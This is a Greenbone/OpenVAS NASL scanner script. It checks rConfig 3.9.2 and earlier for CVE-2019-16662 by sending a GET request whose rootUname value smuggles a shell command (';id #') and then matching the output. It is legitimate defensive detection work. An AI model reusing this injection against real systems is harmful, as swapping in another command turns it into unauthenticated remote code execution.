# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:rconfig:rconfig";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143090");
  script_version("2019-11-05T06:24:15+0000");
  script_tag(name:"last_modification", value:"2019-11-05 06:24:15 +0000 (Tue, 05 Nov 2019)");
  script_tag(name:"creation_date", value:"2019-11-05 04:36:42 +0000 (Tue, 05 Nov 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2019-16662");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("rConfig <= 3.9.2 Unauthenticated RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_rconfig_detect.nasl");
  script_mandatory_keys("rconfig/detected");

  script_tag(name:"summary", value:"rConfig is prone to an unauthenticated remote code execution vulnerability in
  ajaxServerSettingsChk.php.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"rConfig version 3.9.2 and prior.");

  script_tag(name:"solution", value:"Delete the install directory as proposed in the installation guide.");

  script_xref(name:"URL", value:"https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/");
  script_xref(name:"URL", value:"http://help.rconfig.com/gettingstarted/postinstall");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=" + urlencode(str: ";id #");

if (http_vuln_check(port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+", check_header: TRUE)) {
  report = "It was possible to execute the 'id' command at " + report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
